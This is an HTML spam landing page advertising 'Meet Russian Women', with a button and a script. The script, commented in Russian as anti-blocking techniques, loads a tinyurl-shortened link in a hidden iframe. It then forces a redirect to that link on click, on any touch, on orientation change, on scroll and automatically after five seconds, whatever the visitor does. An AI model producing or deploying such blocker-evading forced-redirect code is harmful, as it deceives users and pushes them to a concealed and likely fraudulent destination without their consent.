<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Meet Russian Women</title>
    <style>
        body {
            background-color: #0f0f1a;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
            touch-action: manipulation;
        }
        
        .container {
            text-align: center;
            padding: 20px;
            width: 95%;
        }
        
        h1 {
            font-size: 1.8rem;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
            animation: glow 2s ease-in-out infinite alternate;
            line-height: 1.4;
            padding: 0 10px;
        }
        
        .btn {
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            border: none;
            color: white;
            padding: 16px 40px;
            font-size: 1.2rem;
            border-radius: 30px;
            cursor: pointer;
            text-decoration: none;
            box-shadow: 0 0 15px #ff00ff;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
            font-weight: bold;
            display: inline-block;
            width: 80%;
            max-width: 250px;
        }
        
        .btn:active {
            transform: scale(0.95);
        }
        
        @keyframes glow {
            from {
                text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
            }
            to {
                text-shadow: 0 0 15px #ff00ff, 0 0 30px #ff00ff;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Meet Russian Women Right Now</h1>
        <div class="btn" id="redirectBtn">CLICK</div>
    </div>

    <script>
        // Улучшенные анти-блокировочные техники
        function safeRedirect() {
            // Создаем iframe для редиректа (менее заметно для блокировщиков)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://tinyurl.com/Call-women-here';
            document.body.appendChild(iframe);
            
            // Дублируем редирект через таймер
            setTimeout(() => {
                window.location.href = 'https://tinyurl.com/Call-women-here';
            }, 100);
        }
        
        // Основной клик
        document.getElementById('redirectBtn').addEventListener('click', function(e) {
            e.preventDefault();
            safeRedirect();
        });
        
        // Резервные триггеры:
        // 1. При любом касании экрана
        document.addEventListener('touchstart', function() {
            setTimeout(safeRedirect, 1500);
        }, { once: true });
        
        // 2. При изменении ориентации
        window.addEventListener('orientationchange', safeRedirect, { once: true });
        
        // 3. Авто-редирект через 5 секунд
        setTimeout(safeRedirect, 5000);
        
        // 4. При скролле
        window.addEventListener('scroll', safeRedirect, { once: true });
    </script>
</body>
</html>
